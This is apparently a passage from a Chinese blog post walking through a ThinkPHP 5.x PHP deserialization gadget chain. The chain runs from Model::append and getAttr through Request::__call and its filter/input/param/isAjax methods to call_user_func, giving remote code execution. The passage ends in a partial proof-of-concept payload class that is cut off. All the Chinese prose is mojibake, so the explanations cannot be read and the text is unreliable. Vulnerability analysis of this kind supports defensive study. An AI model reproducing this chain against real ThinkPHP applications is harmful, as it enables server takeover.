class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ç”¨çš„æ˜¯è¿™ä¸€æ®µ</p><p><img src="https://img-blog.csdnimg.cn/d73f0d00ef1b46a6bef0ecb18996e2d1.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_17,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>çœ‹åˆ°è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œå¦‚æœ**$relation<strong>å¯æ§ï¼Œä¸”</strong>visible($name)<strong>å¯æ§ï¼Œé‚£ä¹ˆå°±å¯ä»¥å½“ä½œè·³æ¿ï¼Œå»è°ƒç”¨</strong>visible<strong>æˆ–è€…</strong>__call**æ–¹æ³•</p><p>å¥½ï¼Œç°åœ¨æ¥çœ‹ï¼Œå…¶ä¸­**$this-&gt;append**å¯æ§</p><p>å…ˆçœ‹çœ‹èƒ½ä¸èƒ½ç»•è¿‡æ‰€æœ‰åˆ¤æ–­ï¼Œè¿›å…¥**$relation-&gt;visible($name)**è¿™ä¸€æ­¥</p><p>è°ƒç”¨äº†<strong>getRelation</strong>,è·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/27bf44bd44af40c88a2d3d46cd7fc66b.png?x-ss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$this-&gt;relation**å¯æ§</p><p>å¾ˆå®¹æ˜“æ„é€ è¿”å›ä¸ºç©ºï¼Œä½¿å¾—<code>if (!$relation)</code>æˆç«‹</p><p>è·Ÿè¿›<strong>getAttr</strong></p><p><img src="https://img-blog.csdnimg.cn/5b6f760190df4d57ac2860a8bea0446a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_16,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›<strong>getData</strong></p><p><img src="https://img-blog.csdnimg.cn/a15501a6b2144a3895edb0734adfdf9a.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$this-&gt;data<strong>å¯æ§ï¼Œ</strong>$name<strong>ä¸º<code>$this-&gt;append</code>çš„é”®å</strong>$key<strong>ï¼Œå¯æ§ï¼Œæ‰€ä»¥è¿”å›çš„å€¼å¯æ§ï¼Œæ‰€ä»¥</strong>$value<strong>å¯æ§ï¼Œæ‰€ä»¥ç›¸å½“äº<code>$relation =$this-&gt;data[$key]</code>,å› æ­¤</strong>$relation<strong>å®Œå…¨å¯æ§ï¼Œè€Œ<code>$relation-&gt;visible($name);</code>ä¸­çš„</strong>$name**æ˜¯<code>foreach ($this-&gt;append as $key =&gt; $name)</code>ä¸­çš„é”®å€¼ï¼Œä¹Ÿæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥<code>$relation-&gt;visible($name);</code>æ•´ä¸ªéƒ½æ˜¯å¯æ§çš„</p><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>Conversion</strong>å’Œ<strong>Attribute</strong>è¿™ä¸¤ä¸ªç±»å®šä¹‰çš„æ—¶å€™éƒ½æ˜¯ç”¨çš„<strong>trait</strong></p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­ç±»åŒæ—¶ç»§æ‰¿äº†Attributeç±»å’ŒConversionç±»ã€‚æœ€ç»ˆæ¥åˆ°<code>\thinkphp\library\think\Model.php</code></p><p><img src="https://img-blog.csdnimg.cn/7719485afeca4b878608b6c429208459.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶åæˆ‘ä»¬å…¨å±€å¯»æ‰¾<strong>visble</strong>æ–¹æ³•ï¼Œæœ€ç»ˆå‘ç°éƒ½ä¸å¯ç”¨</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»ä¸­è¦æ²¡æœ‰<strong>visible</strong>æ–¹æ³•ï¼Œä¸”è¦å­˜åœ¨**__call**æ–¹æ³•</p><p>æ¥åˆ°<code>/thinkphp/library/think/Request.php</code></p><p><img src="https://img-blog.csdnimg.cn/ee72f337de764e68ade6a5b596dab8f7.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œå‘ç°<strong>call_user_func_array</strong>å‡½æ•°å¯ä»¥åˆ©ç”¨ä»è€Œæ‰§è¡Œ<strong>system</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰æ™®é€šä½¿ç”¨ï¼š</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123;  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//è¾“å‡º 1 2</span></span><br><span class="line"></span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰è°ƒç”¨ç±»å†…éƒ¨çš„æ–¹æ³•ï¼š</span><br><span class="line"></span><br><span class="line">         Class ClassA &#123; </span><br><span class="line"></span><br><span class="line">                 <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">                  <span class="variable">$a</span> = <span class="variable">$b</span> + <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">                  <span class="keyword">echo</span> <span class="variable">$a</span>; </span><br><span class="line"></span><br><span class="line">                 &#125; </span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;ClassA&#x27;</span>,<span class="string">&#x27;a&#x27;</span>), <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//è¾“å‡º  3 </span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œçš„**$method<strong>æ˜¯å‰é¢çš„</strong>visible<strong>ï¼Œä¸å¯æ§ï¼Œè€Œ</strong>$args<strong>æ˜¯ä¹‹å‰çš„</strong>$name<strong>å¯æ§ï¼Œä½†æ˜¯<code>array_unshift($args, $this)</code>æŠŠ<code>$this</code>æ’å…¥åˆ°äº†<code>$args</code>çš„æœ€å‰é¢ï¼Œå¯¼è‡´</strong>system**ä¸å¯ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_unshift() å‡½æ•°ç”¨äºå‘æ•°ç»„æ’å…¥æ–°å…ƒç´ ã€‚æ–°æ•°ç»„çš„å€¼å°†è¢«æ’å…¥åˆ°æ•°ç»„çš„å¼€å¤´ã€‚</span><br></pre></td></tr></table></figure><p><strong>æ–°æ€è·¯(å˜é‡è¦†ç›–)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨Thinkphpçš„Requestç±»ä¸­è¿˜æœ‰ä¸€ä¸ªfilteråŠŸèƒ½ï¼Œäº‹å®ä¸ŠThinkphpå¤šä¸ªRCEéƒ½ä¸è¿™ä¸ªåŠŸèƒ½æœ‰å…³ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•è¦†ç›–filterçš„æ–¹æ³•å»æ‰§è¡Œä»£ç ã€‚</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°<strong>filterValue</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/cf7ca15f141f4b2492dd31d326eb54cd.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>éœ€è¦åˆ©ç”¨è¿™é‡Œçš„**$value &#x3D; call_user_func($filter, $value)**ï¼Œä½†æ˜¯<code>$filter</code>å’Œ<code>$value</code>éƒ½ä¸å¯æ§ï¼Œéœ€è¦æ‰¾åˆ°å¯ä»¥åˆ©ç”¨<code>$value</code>çš„åœ°æ–¹ã€‚</p><p>æœ€ç»ˆæ‰¾åˆ°è¿™ä¸ªç±»çš„<strong>input</strong>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params"><span class="variable">$data</span> = [], <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŸå§‹æ•°æ®</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$name</span> = (<span class="keyword">string</span>) <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> != <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// è§£æname</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                <span class="keyword">list</span>(<span class="variable">$name</span>, <span class="variable">$type</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getData</span>(<span class="variable">$data</span>, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$default</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_object</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">        <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="string">&#x27;7.1.0&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">arrayReset</span>(<span class="variable">$data</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filterValue</span>(<span class="variable">$data</span>, <span class="variable">$name</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$type</span>) &amp;&amp; <span class="variable">$data</span> !== <span class="variable">$default</span>) &#123;</span><br><span class="line">            <span class="comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">typeCast</span>(<span class="variable">$data</span>, <span class="variable">$type</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­<strong>input</strong>å‡½æ•°çš„å‚æ•°**$data**ä¸å¯æ§ï¼Œç»§ç»­æ‰¾ä¸€ä¸ªè°ƒç”¨<code>input</code>å‡½æ•°çš„åœ°æ–¹ã€‚æ‰¾åˆ°äº†<code>param</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">            <span class="variable">$method</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">method</span>(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$method</span>) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;PATCH&#x27;</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(<span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="variable">$vars</span> = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;param = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="literal">false</span>), <span class="variable">$vars</span>, <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;mergeParam = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">true</span> === <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span></span><br><span class="line">            <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file</span>();</span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>) ? <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$file</span>) : <span class="variable language_">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$data</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="variable">$this</span>-&gt;param, <span class="variable">$name</span>, <span class="variable">$default</span>, <span class="variable">$filter</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å‚æ•°ä¾æ—§ä¸å¯æ§</p><p>ç»§ç»­æ‰¾è°ƒç”¨<code>param</code>å‡½æ•°çš„åœ°æ–¹ã€‚æ‰¾åˆ°äº†<code>isAjax</code>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/7dc1fde9c201411da755adabd1c94ce5.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­<code>$this-&gt;config[&#39;var_ajax&#39;]</code>å¯æ§,æ„å‘³ç€<code>param</code>å‡½æ•°ä¸­çš„<code>$name</code>å¯æ§ã€‚<code>param</code>å‡½æ•°ä¸­çš„<code>$name</code>å¯æ§å°±æ„å‘³ç€<code>input</code>å‡½æ•°ä¸­çš„<code>$name</code>å¯æ§ã€‚</p><p>æ‰€ä»¥<code>$this-&gt;param</code>æ˜¯getå‚æ•°å¯æ§</p><p>ä¹‹åå†<strong>input</strong>å‡½æ•°ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è§£æè¿‡æ»¤å™¨</span></span><br><span class="line">       <span class="variable">$filter</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFilter</span>(<span class="variable">$filter</span>, <span class="variable">$default</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line">           <span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p><strong>array_walk_recursive</strong>å‡½æ•°</p><p>å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ åº”ç”¨ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šæ•°ç»„ã€‚</td></tr><tr><td align="left"><em>myfunction</em></td><td align="left">å¿…éœ€ã€‚ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„åç§°ã€‚</td></tr><tr><td align="left"><em>parameter,â€¦</em></td><td align="left">å¯é€‰ã€‚è§„å®šç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°çš„å‚æ•°ï¼Œæ‚¨å¯ä»¥ä¸ºå‡½æ•°è®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°ã€‚</td></tr></tbody></table><p>è¿™é‡Œåˆ©ç”¨<strong>array_walk_recursive</strong>å‡½æ•°æ¥è°ƒç”¨<strong>filterValue</strong>æ–¹æ³•ï¼Œå…¶ä¸­ä½œä¸ºå‚æ•°çš„**$filter<strong>æ˜¯é€šè¿‡</strong>getFilter**æ–¹æ³•å¾—åˆ°çš„</p><p><img src="https://img-blog.csdnimg.cn/2a9d5dd1b4764985ad299d44b62fba00.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$filter&#x3D;$this-&gt;filter**å¯æ§</p><p>æ‰€ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_walk_recursive</span>(<span class="variable">$data</span>, [<span class="variable">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br></pre></td></tr></table></figure><p><code>$data</code>ï¼Œ<code>filter</code>éƒ½å½»åº•å¯æ§äº†ï¼Œå³<code>$value = call_user_func($filter, $value)</code>ï¼Œå›è°ƒå‡½æ•°å’Œå‚æ•°éƒ½å¯æ§ï¼Œå³å¯æ„é€ POCäº†ã€‚</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span>=[];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>=[];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append=[<span class="string">&quot;lyy9&quot;</span>=&gt;[<span class="string">&#x27;xxx&#x27;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=[<span class="string">&quot;lyy9&quot;</span>=&gt;<span class="keyword">new</span> <span class="title 